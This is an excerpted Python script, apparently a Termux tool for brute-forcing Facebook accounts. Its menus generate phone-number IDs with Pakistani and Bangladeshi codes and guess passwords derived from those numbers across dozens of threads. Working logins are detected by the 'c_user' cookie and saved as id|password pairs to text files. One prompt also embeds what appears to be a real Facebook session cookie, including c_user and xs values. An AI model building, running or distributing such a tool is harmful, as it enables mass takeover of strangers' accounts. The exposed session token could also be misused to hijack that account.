...
\033[1;93m      ══════════════════════════════════════════════════
           🍁Abdur Rahman Name to sona huga🍁         
  \33[1;37m----------------------------------------------
  \033[1;92m→   Owner      : MD.ABDUR RAHMAN®
  \033[1;93m→   Facebook   :  Md. Abdur Rahman 
  \033[1;94m→   Github     :  MD.ABDUR RAHMAN
  \033[1;92m→   Tool Type  :  \x1b[1;91mFREE
\033[0;95m  →   Version    :  1.2
\33[1;37m----------------------------------------------""")
def linex():
	print('\33[1;37m----------------------------------------------')
loop = 0
...
def menu():
			...
			if rifat in ['1','01']:
				...
				os.system('clear')
				print(logo)
				print('[1] File Method\033[1;92m [1] \n\x1b[1;97m[2] File Method \033[1;92m[2]')
				linex()
				mthd=input(' Choose: ')
				linex()
				plist = []
				...
				os.system('clear')
				print(logo)
				print(' Do you want Show Cookies datr=WCSUZEL5tp9qpUVXN30VIoXv;sb=WCSUZOnkzEFpcfSqCfkpxWSM;dpr=2.200000047683716;vpd=v1%3B956x491x2.200000047683716;c_user=100093601553131;xs=17%3Ah9bYpa6zqWhpnw%3A2%3A1687457031%3A-1%3A-1;m_page_voice=100093601553131;locale=en_GB;fbl_cs=AhD7%2BO%2Fjb3iQZ7AJrPWoR%2BBaGFdLbXZaNURKek9sOTdyR1hhWmoyaGtUbw;fbl_ci=6339739742740634;cppo=1;wl_cbv=v2%3Bclient_version%3A2276%3Btimestamp%3A1687457513;fbl_st=100623687%3BT%3A28124291;usida=eyJ2ZXIiOjEsImlkIjoiQXJ3b3lmYTFlZHlwdm0iLCJ0aW1lIjoxNjg3NDk4ODMxfQ%3D%3D;fr=0hIA8VWUkM4GuoMPW.AWXAlNOdwLkvoZCRzB7vG47sqJk.BklCRY.y4.AAA.0.0.BklTFW.AWUhDjHUKHo;wd=980x1907;presence=C%7B%22t3%22%3A%5B%5D%2C%22utc3%22%3A1687499096701%2C%22v%22%3A1%7D; : ')
				linex()
				cx=input(' Choose: ')
				...
				with tred(max_workers=25) as crack_submit:
					...
					print(' Selected Method : \033[1;92mM '+mthd)
					print(' \x1b[1;93mIF NO RESULT (ON/OF) AIRPLANE MODE')
					linex()
					for user in fo:
...
def mmm(ids,names,passlist):
	global loop,oks,cps
	sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mAR\033[1;97m] %s|\033[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				print('\033[1;92m[AR-OK] '+ids+' | '+pas+'\033[1;32m')
				...
				if 'y' in pcp:
					...
					print('\33[1;31m[AR-CP] '+ids+' | '+pas+'\33[0;97m')
	...
	try:
		...
		for fikr in passlist:
			...
			if "c_user" in AXI:
				...
				if 'y' in pcp:
					print('\33[1;91m[AR-CP] '+ids+' | '+pas+'\33[0;97m')
					open('/sdcard/AR-CP.txt', 'a').write(ids+'|'+pas+'\n')
					cps.append(ids)
					break
				else:
...
def rifat1():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] Pak Random Method \033[1;92m[1]')
	print('\x1b[1;97m[2] Pak Random Method \033[1;92m[2]')
...
def random_number1():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		print(' Selected Code : \033[1;92m'+kode)
		print('  \033[1;93m IF NO RESULT (ON/OF) AIRPLANE MODE')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode]
...
def random_number2():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		print(' Total Acounts : '+tl)
		print(' Selected Code : \033[1;92m'+kode)
		print('\x1b[1;91m IF NO RESULT (ON/OF) AIRPLANE MODE')
		linex()
		for guru in uid:
			uid = kode+guru
			pwx = [guru,kode+guru]
...
def bd():
	os.system('clear')
	print(logo)
	print('\x1b[1;97m[1] BD Randm Method\033[1;92m [1]')
	print('\x1b[1;97m[2] BD Randm Method \033[1;92m[2]')
...
def random_number3():
	...
	with ThreadPool(max_workers=35) as yaari:
		...
		tl = str(len(uid))
		print(' Total Acounts : '+tl)
		print(' Select Code :   \033[1;92m'+kode)
		print('\x1b[1;91m IF NO RESULT (ON/OF) AIRPLANE MODE')
		linex()
		for guru in uid:
			uid = kode+guru
...
def chos():
    ...
    with ThreadPool(max_workers=50) as manshera:
        ...
        tl = str(len(user))
        print(' Total Acounts : '+tl)
        print(' Selected Code :\033[1;92m '+code)
        print('\x1b[1;91m IF NO RESULT (ON/OF) AIRPLANE MODE')
        linex()
        for love in user:
            pwx = [love[1:]]
	...
	try:
		for ps in pwx:
			...
			if 'c_user' in log_cookies:
				...
				cid = coki[151:166]
				print('\033[1;92m[AR-OK] '+cid+' | '+ps+'\033[1;92m')
				...
				coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
				cid = coki[141:156]
				print('\33[1;31m[AR-CP] '+cid+' | '+ps+'\33[1;93m')
				open('AR-CP.txt', 'a').write(cid+' | '+ps+'\n')
				cps.append(cid)
				break
			else:
				continue
